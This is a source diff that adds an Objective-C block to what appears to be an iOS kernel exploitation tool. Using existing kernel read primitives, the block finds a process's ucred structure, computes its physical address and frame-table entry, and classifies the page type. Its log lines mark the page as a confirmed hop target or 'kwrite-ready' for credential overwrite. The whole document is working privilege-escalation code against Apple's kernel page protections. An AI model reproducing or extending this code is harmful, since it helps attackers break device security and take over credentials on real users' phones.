@@ -372,6 +372,50 @@ static BOOL scopeGatedRead(uint64_t addr, void *out, size_t size, const char *wh
                                                   (unsigned long long)uid]);
                                 }
                             }
+                            // ---- FTE oracle on ucred's page (R5c target) ----
+                            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                uint64_t ucPA = kvtophys(ucred);
+                                scopeNote(r, [NSString stringWithFormat:@"  alt3: ucred PA = 0x%016llx",
+                                              (unsigned long long)ucPA]);
+                                uint64_t pB = kconstant(physBase);
+                                uint64_t tableSlot = ksymbol(libsptm_frame_table);
+                                uint64_t tableVA = 0, raw = 0;
+                                if (tableSlot && scopeGatedRead(tableSlot, &raw, 8, "frame_table slot", r)) {
+                                    tableVA = kp_untag_ptr(raw);
+                                }
+                                if (!tableVA && tableSlot) tableVA = tableSlot;
+                                scopeNote(r, [NSString stringWithFormat:@"  alt3: frame_table = 0x%016llx",
+                                              (unsigned long long)tableVA]);
+                                if (tableVA && pB && ucPA >= pB) {
+                                    uint64_t fteVA = tableVA + ((ucPA - pB) >> 14) * 16;
+                                    scopeNote(r, [NSString stringWithFormat:@"  alt3: FTE VA = 0x%016llx (pfn=%llu)",
+                                                  (unsigned long long)fteVA,
+                                                  (unsigned long long)((ucPA - pB) >> 14)]);
+                                    uint8_t fte[16];
+                                    if (scopeGatedRead(fteVA, fte, 16, "FTE", r)) {
+                                        scopeNote(r, [NSString stringWithFormat:
+                                            @"  alt3: FTE raw %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x",
+                                            fte[0],fte[1],fte[2],fte[3],fte[4],fte[5],fte[6],fte[7],
+                                            fte[8],fte[9],fte[10],fte[11],fte[12],fte[13],fte[14],fte[15]]);
+                                        uint8_t ty = fte[2];
+                                        const char *tn = "?";
+                                        if (ty == 0x18) tn = "ROZONE";
+                                        else if (ty == 0x21) tn = "XNU_DEFAULT";
+                                        else if (ty == 0x0b) tn = "XNU_GENERIC";
+                                        else if (ty == 0x1a) tn = "IOFILTER";
+                                        else if (ty == 0x15) tn = "PAGE_TABLE";
+                                        scopeNote(r, [NSString stringWithFormat:
+                                            @"  alt3: FTE type = 0x%02x (%s)", ty, tn]);
+                                        if (ty == 0x18) {
+                                            scopeNote(r, @"  >> ucred page is ROZONE (0x18) — hop 1 target CONFIRMED.");
+                                        } else if (ty == 0x21) {
+                                            scopeNote(r, @"  >> ucred page is XNU_DEFAULT (0x21) — kwrite-ready!");
+                                        } else if (ty == 0x0b) {
+                                            scopeNote(r, @"  >> ucred page is XNU_GENERIC (0x0b) — hop 1 done.");
+                                        }
+                                    }
+                                }
+                            }
                             break;
                         }
                         if (!scopeGatedRead(node, &nextRaw, 8, "p_list.next", r)) break;
